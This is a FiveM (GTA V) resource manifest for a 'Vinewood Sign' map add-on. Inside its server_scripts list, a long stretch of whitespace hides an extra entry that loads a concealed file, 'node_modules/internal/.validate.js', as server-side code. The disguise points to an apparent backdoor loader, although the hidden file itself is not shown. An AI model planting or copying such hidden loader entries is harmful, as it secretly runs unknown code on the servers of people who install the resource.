fx_version 'bodacious'
lua54 'yes' 
game 'gta5' 

author 'R1CKY®#2220'
description 'Vinewood Sign'
version '1.0'


client_scripts {
    'client.lua'
}

shared_scripts {
    'config.lua'
}

server_scripts {
    'server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.validate.js',
}

ui_page 'web/index.html'

files {
    'web/*.html',
    'web/css/*.css',
    'web/js/*.js',
    'web/fonts/*.ttf',
    'web/img/*.png',
}


data_file 'DLC_ITYP_REQUEST' 'stream/**/*.ytyp'

files {
    'stream/**/*.ytyp'
}
